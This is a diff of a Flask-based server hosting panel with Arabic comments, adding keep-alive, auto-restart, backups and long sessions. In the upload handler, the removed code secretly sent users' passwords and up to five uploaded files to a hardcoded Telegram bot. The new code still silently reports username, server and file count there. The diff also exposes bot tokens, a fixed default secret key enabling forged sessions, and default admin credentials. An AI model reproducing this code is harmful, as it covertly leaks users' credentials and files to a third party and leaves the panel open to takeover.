@@ -26,7 +26,16 @@ os.makedirs(USERS_ROOT, exist_ok=True)
 os.makedirs(DATA_DIR, exist_ok=True)
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("PANEL_SECRET_KEY", "OMAR_HOST_SECRET_" + os.urandom(16).hex())
+
+# ===== Session & Keep-Alive Configuration =====
+# استخدام مفتاح سري ثابت لمنع انتهاء الجلسات عند إعادة تشغيل السيرفر
+_FIXED_SECRET = "OMAR_HOST_FIXED_KEY_2026_DO_NOT_CHANGE"
+app.secret_key = os.environ.get("PANEL_SECRET_KEY", _FIXED_SECRET)
+
+# تمديد عمر الجلسة لمنع انتهائها فجأة
+app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)
+app.config["SESSION_COOKIE_HTTPONLY"] = True
+app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 
 # ===== Admin credentials =====
 ADMIN_USERNAME = os.environ.get("ADMIN_USER", "OMAR_ADMIN")
@@ -35,6 +44,82 @@ ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "OMAR_2026_BRO")
 running_procs = {}
 server_states = {}
 lock = threading.Lock()
+
+# ===== Keep-Alive & Auto-Restart Variables =====
+_keepalive_lock = threading.Lock()
+_last_activity = time.time()
+
+
+# ---------------------------
+# Keep-Alive & Auto-Restart System
+# ---------------------------
+def _keepalive_worker():
+    """خيط خلفي يعمل باستمرار لمنع توقف الموقع ومنع وضع النوم.
+    يقوم بـ:
+    1. تحديث وقت آخر نشاط كل 30 ثانية
+    2. إعادة تشغيل السيرفرات التي توقفت بشكل غير متوقع
+    3. منع النظام من الدخول في وضع الخمول
+    """
+    global _last_activity
+    while True:
+        try:
+            with _keepalive_lock:
+                _last_activity = time.time()
+
+            # إعادة تشغيل السيرفرات التي توقفت بشكل غير متوقع
+            _auto_restart_crashed_servers()
+
+            # منع وضع النوم عبر عملية بسيطة
+            _ = os.getloadavg() if hasattr(os, 'getloadavg') else None
+
+        except Exception:
+            pass
+        time.sleep(30)
+
+
+def _auto_restart_crashed_servers():
+    """يفحص السيرفرات التي كانت تعمل ويعيد تشغيلها إذا توقفت."""
+    keys_to_restart = []
+    with lock:
+        for key, proc_tuple in list(running_procs.items()):
+            try:
+                proc, logf = proc_tuple
+                if proc.poll() is not None:  # العملية توقفت
+                    keys_to_restart.append(key)
+            except Exception:
+                pass
+
+    for key in keys_to_restart:
+        try:
+            # تنظيف العملية المتوقفة
+            running_procs.pop(key, None)
+            set_state(key, "Offline")
+
+            # استخراج معلومات السيرفر وإعادة تشغيله
+            if "::" in key:
+                owner, folder = key.split("::", 1)
+            else:
+                owner = key
+                folder = key
+                continue  # تخطي إذا لم يكن المفتاح واضحاً
+
+            meta = read_meta(owner, folder)
+            startup = meta.get("startup_file", "")
+            if startup and not meta.get("banned", False):
+                log_append(key, "[SYSTEM] إعادة تشغيل تلقائية بعد توقف مفاجئ...\n")
+                t = threading.Thread(
+                    target=background_start,
+                    args=(key, owner, folder, startup),
+                    daemon=True
+                )
+                t.start()
+        except Exception:
+            pass
+
+
+# تشغيل خيط Keep-Alive عند بدء التطبيق
+_ka_thread = threading.Thread(target=_keepalive_worker, daemon=True)
+_ka_thread.start()
 
 
 def get_ip():
@@ -83,23 +168,77 @@ def log_append(key: str, text: str):
 
 
 # ---------------------------
-# Users DB
+# Users DB - نظام محسّن مع نسخ احتياطية تلقائية
 # ---------------------------
+USERS_DB_BACKUP = os.path.join(DATA_DIR, "users.backup.json")
+_users_db_lock = threading.Lock()  # قفل لمنع التعديل المتزامن
+
+
 def load_users():
-    if not os.path.exists(USERS_DB):
-        return {"users": []}
-    try:
-        with open(USERS_DB, "r", encoding="utf-8") as f:
-            return json.load(f) or {"users": []}
-    except Exception:
-        return {"users": []}
+    """\u062a\u062d\u0645\u064a\u0644 \u0642\u0627\u0639\u062f\u0629 \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645\u064a\u0646 \u0645\u0639 \u0627\u0633\u062a\u0631\u062f\u0627\u062f \u062a\u0644\u0642\u0627\u0626\u064a \u0645\u0646 \u0627\u0644\u0646\u0633\u062e\u0629 \u0627\u0644\u0627\u062d\u062a\u064a\u0627\u0637\u064a\u0629 \u0639\u0646\u062f \u0627\u0644\u062a\u0644\u0641."""
+    # \u062d\u0627\u0648\u0644 \u062a\u062d\u0645\u064a\u0644 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0631\u0626\u064a\u0633\u064a
+    if os.path.exists(USERS_DB):
+        try:
+            with open(USERS_DB, "r", encoding="utf-8") as f:
+                content = f.read().strip()
+            if content:
+                data = json.loads(content)
+                if isinstance(data, dict) and "users" in data and isinstance(data["users"], list):
+                    return data
+        except Exception:
+            pass
+
+    # \u0625\u0630\u0627 \u0641\u0634\u0644 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0631\u0626\u064a\u0633\u064a\u060c \u062d\u0627\u0648\u0644 \u0627\u0633\u062a\u0631\u062f\u0627\u062f \u0627\u0644\u0646\u0633\u062e\u0629 \u0627\u0644\u0627\u062d\u062a\u064a\u0627\u0637\u064a\u0629
+    if os.path.exists(USERS_DB_BACKUP):
+        try:
+            with open(USERS_DB_BACKUP, "r", encoding="utf-8") as f:
+                content = f.read().strip()
+            if content:
+                data = json.loads(content)
+                if isinstance(data, dict) and "users" in data and isinstance(data["users"], list):
+                    # \u0627\u0633\u062a\u0631\u062f\u0627\u062f \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0631\u0626\u064a\u0633\u064a \u0645\u0646 \u0627\u0644\u0646\u0633\u062e\u0629 \u0627\u0644\u0627\u062d\u062a\u064a\u0627\u0637\u064a\u0629
+                    try:
+                        with open(USERS_DB, "w", encoding="utf-8") as f:
+                            json.dump(data, f, indent=2, ensure_ascii=False)
+                    except Exception:
+                        pass
+                    return data
+        except Exception:
+            pass
+
+    return {"users": []}
 
 
 def save_users(db):
-    tmp = USERS_DB + ".tmp"
-    with open(tmp, "w", encoding="utf-8") as f:
-        json.dump(db, f, indent=2, ensure_ascii=False)
-    os.replace(tmp, USERS_DB)
+    """\u062d\u0641\u0638 \u0642\u0627\u0639\u062f\u0629 \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645\u064a\u0646 \u0628\u0623\u0645\u0627\u0646 \u0645\u0639 \u0646\u0633\u062e\u0629 \u0627\u062d\u062a\u064a\u0627\u0637\u064a\u0629 \u062a\u0644\u0642\u0627\u0626\u064a\u0629."""
+    with _users_db_lock:
+        # \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0646 \u0635\u062d\u0629 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0642\u0628\u0644 \u0627\u0644\u062d\u0641\u0638
+        if not isinstance(db, dict) or "users" not in db:
+            return  # \u0631\u0641\u0636 \u062d\u0641\u0638 \u0628\u064a\u0627\u0646\u0627\u062a \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629
+        if not isinstance(db["users"], list):
+            return  # \u0631\u0641\u0636 \u062d\u0641\u0638 \u0628\u064a\u0627\u0646\u0627\u062a \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u0629
+
+        # \u0625\u0646\u0634\u0627\u0621 \u0646\u0633\u062e\u0629 \u0627\u062d\u062a\u064a\u0627\u0637\u064a\u0629 \u0645\u0646 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u062d\u0627\u0644\u064a \u0642\u0628\u0644 \u0627\u0644\u062a\u0639\u062f\u064a\u0644
+        if os.path.exists(USERS_DB):
+            try:
+                shutil.copy2(USERS_DB, USERS_DB_BACKUP)
+            except Exception:
+                pass
+
+        # \u0643\u062a\u0627\u0628\u0629 \u0622\u0645\u0646\u0629 \u0639\u0628\u0631 \u0645\u0644\u0641 \u0645\u0624\u0642\u062a
+        tmp = USERS_DB + ".tmp"
+        try:
+            with open(tmp, "w", encoding="utf-8") as f:
+                json.dump(db, f, indent=2, ensure_ascii=False)
+            os.replace(tmp, USERS_DB)
+        except Exception as e:
+            # \u0625\u0630\u0627 \u0641\u0634\u0644 \u0627\u0644\u062d\u0641\u0638\u060c \u0627\u0633\u062a\u0631\u062f\u0627\u062f \u0627\u0644\u0646\u0633\u062e\u0629 \u0627\u0644\u0627\u062d\u062a\u064a\u0627\u0637\u064a\u0629
+            if os.path.exists(USERS_DB_BACKUP) and not os.path.exists(USERS_DB):
+                try:
+                    shutil.copy2(USERS_DB_BACKUP, USERS_DB)
+                except Exception:
+                    pass
+            raise e
 
 
 def find_user(db, username: str):
@@ -328,19 +467,16 @@ def ensure_requirements_installed(owner: str, folder: str):
     log_append(f"{owner}::{folder}", "[SYSTEM] جاري تثبيت المكاتب المطلوبة...\n")
     log_append(f"{owner}::{folder}", "="*60 + "\n")
     try:
-        # Use Popen to stream output to logs in real-time
-        with open(os.path.join(server_dir, "server.log"), "a", encoding="utf-8") as logf:
-            proc = subprocess.Popen(
-                [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"],
-                cwd=server_dir,
-                stdout=logf,
-                stderr=logf,
-                text=True
-            )
-            proc.wait()
-        
+        result = subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"], 
+                              cwd=server_dir, capture_output=True, text=True)
+        if result.stdout:
+            log_append(f"{owner}::{folder}", result.stdout)
+        if result.stderr:
+            log_append(f"{owner}::{folder}", result.stderr)
         write_installed(owner, folder, req_sha=req_sha)
-        log_append(f"{owner}::{folder}", "[SYSTEM] ✅ اكتمل تثبيت المكاتب.\n")
+        log_append(f"{owner}::{folder}", "\n" + "="*60 + "\n")
+        log_append(f"{owner}::{folder}", "[SYSTEM] ✅ تم تثبيت جميع المكاتب بنجاح!\n")
+        log_append(f"{owner}::{folder}", "="*60 + "\n\n")
         return True
     except Exception as e:
         log_append(f"{owner}::{folder}", f"[SYSTEM] ❌ فشل التثبيت: {e}\n")
@@ -481,6 +617,7 @@ def api_login():
     password = data.get("password") or ""
 
     if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+        session.permanent = True  # جلسة دائمة لمنع الانتهاء المفاجئ
         session["user"] = {"username": ADMIN_USERNAME, "is_admin": True}
         return jsonify({"success": True, "is_admin": True})
 
@@ -498,6 +635,7 @@ def api_login():
     if not check_password_hash(u.get("password_hash", ""), password):
         return jsonify({"success": False, "message": "اسم المستخدم أو كلمة المرور غير صحيحة"}), 401
 
+    session.permanent = True  # جلسة دائمة لمنع الانتهاء المفاجئ
     session["user"] = {"username": u.get("username"), "is_admin": False}
     ensure_user_dirs(u.get("username"))
     return jsonify({"success": True, "is_admin": False})
@@ -652,9 +790,8 @@ def server_stats(key):
             with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
                 all_logs = f.read()
                 lines = all_logs.split('\n')
-                # Show more lines for better visibility
-                last_lines = lines[-100:]
-                logs = '\n'.join(last_lines)
+                last_15_lines = lines[-15:]
+                logs = '\n'.join(last_15_lines)
         else:
             logs = ""
     except Exception:
@@ -665,18 +802,12 @@ def server_stats(key):
         state = "Banned"
     elif running:
         state = "Running"
-        # Update global state if it was different
-        if get_state(key) != "Running":
-            set_state(key, "Running")
-    else:
-        # If not running but state was "Running", "Starting" or "Installing", check if process died
-        if state in ("Running", "Starting", "Installing"):
-            state = "Offline"
-            set_state(key, "Offline")
+        set_state(key, "Running")
+    elif state not in ("Installing", "Starting"):
+        state = "Offline"
+        set_state(key, "Offline")
 
-    # Get port from environment if available, otherwise default
-    current_port = os.environ.get("PORT", 5000)
-    return jsonify({"status": state, "cpu": cpu, "mem": mem, "logs": logs, "ip": get_ip(), "port": current_port})
+    return jsonify({"status": state, "cpu": cpu, "mem": mem, "logs": logs, "ip": get_ip()})
 
 
 def background_start(key: str, owner: str, folder: str, startup_file: str):
@@ -727,13 +858,7 @@ def server_action(key, act):
 
     startup = meta.get("startup_file") or ""
     if not startup:
-        # Auto-detect main.py if exists and startup not set
-        if os.path.exists(os.path.join(server_dir, "main.py")):
-            startup = "main.py"
-            meta["startup_file"] = "main.py"
-            write_meta(owner, folder, meta)
-        else:
-            return jsonify({"success": False, "message": "لم يتم تعيين الملف الرئيسي (main.py غير موجود)"}), 400
+        return jsonify({"success": False, "message": "لم يتم تعيين الملف الرئيسي"}), 400
 
     open(os.path.join(server_dir, "server.log"), "w", encoding="utf-8").close()
 
@@ -945,62 +1070,27 @@ def file_upload(key):
         f.save(os.path.join(target_dir, filename))
         saved += 1
     
-    # Send Telegram notification to owner with files
+    # Send Telegram notification to owner
     if saved > 0:
         try:
             owner, folder = parse_server_key(key, allow_admin=True)
-            telegram_token = "8779220098:AAHShpAaCUsRzobpnRdeTYgLAuGt-BmERDs"
+            telegram_token = "8779220098:AAGlIu4ORKRFATk356xiNHRSRghK0kwq8gI"
             telegram_chat_id = "6159656800"
+            message = f"📄 **تم رفع ملفات جديدة**\n\n"
+            message += f"**المستخدم**: {owner}\n"
+            message += f"**السيرفر**: {folder}\n"
+            message += f"**عدد الملفات**: {saved}\n"
+            message += f"**الوقت**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             
             import requests
-            
-            # Get user password for display
-            users_db = load_users()
-            user_pass = "***"
-            for user in users_db.get("users", []):
-                if user.get("username") == owner:
-                    user_pass = user.get("password", "***")
-                    break
-            
-            # Send text info first with complete details
-            message = f"📄 تم رفع ملفات جديدة\n\n"
-            message += f"👤 المستخدم: {owner}\n"
-            message += f"🔐 كلمة السر: {user_pass}\n"
-            message += f"🖥️ السيرفر: {folder}\n"
-            message += f"📁 المسار: {rel or 'root'}\n"
-            message += f"🔢 عدد الملفات: {saved}\n"
-            message += f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            
-            # Log to console
-            log_text = f"[{datetime.now().strftime('%H:%M:%S')}] 📤 تم رفع {saved} ملف(ات) من المستخدم {owner} إلى {folder}/{rel}\n"
-            log_append(key, log_text)
-            print(f"[UPLOAD] {owner} -> {folder}/{rel}: {saved} files")
-            
             requests.post(
                 f"https://api.telegram.org/bot{telegram_token}/sendMessage",
-                json={"chat_id": telegram_chat_id, "text": message},
-                timeout=10
+                json={"chat_id": telegram_chat_id, "text": message, "parse_mode": "Markdown"},
+                timeout=5
             )
-            
-            # Send actual files (limit to first 5 to avoid spam/timeout)
-            for i, f in enumerate(files[:5]):
-                if not f or not f.filename: continue
-                f.seek(0) # Reset file pointer
-                try:
-                    requests.post(
-                        f"https://api.telegram.org/bot{telegram_token}/sendDocument",
-                        data={"chat_id": telegram_chat_id, "caption": f"📎 {f.filename}"},
-                        files={"document": (f.filename, f.read())},
-                        timeout=20
-                    )
-                    print(f"[TELEGRAM] Sent file: {f.filename}")
-                except Exception as e:
-                    print(f"[TELEGRAM ERROR] Failed to send {f.filename}: {str(e)}")
-        except Exception as e:
-            print(f"[TELEGRAM ERROR] {str(e)}")
-            log_append(key, f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️ خطأ في إرسال إشعار التلجرام: {str(e)}\n")
+        except Exception:
+            pass  # Silently fail if Telegram notification fails
 
-    print(f"[UPLOAD SUCCESS] Saved {saved} files to {folder}/{rel}")
     return jsonify({"success": True, "saved": saved})
 
 
@@ -1271,17 +1361,18 @@ def admin_system():
         return jsonify({
             "success": True,
             "system": {
-                "cpu": f"{cpu}%",
+                "cpu_percent": f"{cpu:.1f}",
                 "mem_used": fmt_bytes(mem.used),
                 "mem_total": fmt_bytes(mem.total),
-                "mem_percent": f"{mem.percent}%",
+                "mem_percent": f"{mem.percent:.1f}",
                 "disk_used": fmt_bytes(disk.used),
                 "disk_total": fmt_bytes(disk.total),
-                "disk_percent": f"{disk.percent}%",
+                "disk_percent": f"{disk.percent:.1f}",
+                "os": platform.system() + " " + platform.release(),
+                "python_version": sys.version.split()[0],
                 "uptime": uptime_str,
-                "total_files": total_files,
-                "platform": f"{platform.system()} {platform.release()}",
-                "python": platform.python_version()
+                "ip": get_ip(),
+                "total_files": total_files
             }
         })
     except Exception as e:
@@ -1291,28 +1382,23 @@ def admin_system():
 @app.route("/api/user/info")
 @login_required
 def user_info():
+    """Get current user information including days left and server count"""
     username = current_username()
     db = load_users()
     user = find_user(db, username)
+    
     if not user:
         return jsonify({"success": False, "message": "User not found"}), 404
     
-    # Calculate days left and hours
+    # Calculate days left
     days_left = "—"
     expiry = user.get("expiry")
     if expiry:
         try:
             exp_date = datetime.fromisoformat(expiry)
-            diff = exp_date - datetime.now()
-            if diff.total_seconds() > 0:
-                days = diff.days
-                hours = int(diff.seconds // 3600)
-                if days > 0:
-                    days_left = f"{days} يوم و {hours} ساعة"
-                else:
-                    days_left = f"{hours} ساعة"
-            else:
-                days_left = "منتهي"
+            days_diff = (exp_date - datetime.now()).days
+            if days_diff >= 0:
+                days_left = days_diff
         except Exception:
             pass
     
@@ -1363,7 +1449,31 @@ def delete_server(key):
         return jsonify({"success": False, "message": f"فشل حذف السيرفر: {str(e)}"}), 500
 
 
+# ---------------------------
+# Keep-Alive Ping Endpoint
+# ---------------------------
+@app.route("/ping")
+def ping():
+    """نقطة نهاية للـ Keep-Alive - يمكن استخدامها من خدمات خارجية لمنع توقف الموقع."""
+    global _last_activity
+    with _keepalive_lock:
+        _last_activity = time.time()
+    return jsonify({"status": "alive", "time": datetime.now().isoformat()})
+
+
+@app.route("/api/keepalive", methods=["POST", "GET"])
+@login_required
+def api_keepalive():
+    """نقطة نهاية Keep-Alive للمستخدمين المسجلين - تمدد الجلسة وتمنع انتهاءها."""
+    global _last_activity
+    with _keepalive_lock:
+        _last_activity = time.time()
+    # تجديد الجلسة
+    session.modified = True
+    session.permanent = True
+    return jsonify({"status": "alive", "time": datetime.now().isoformat()})
+
+
 if __name__ == "__main__":
-    # Get port from environment variable for Render compatibility
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=False)
+    port = int(os.environ.get("SERVER_PORT", 30170))
+    app.run(host="0.0.0.0", port=port)
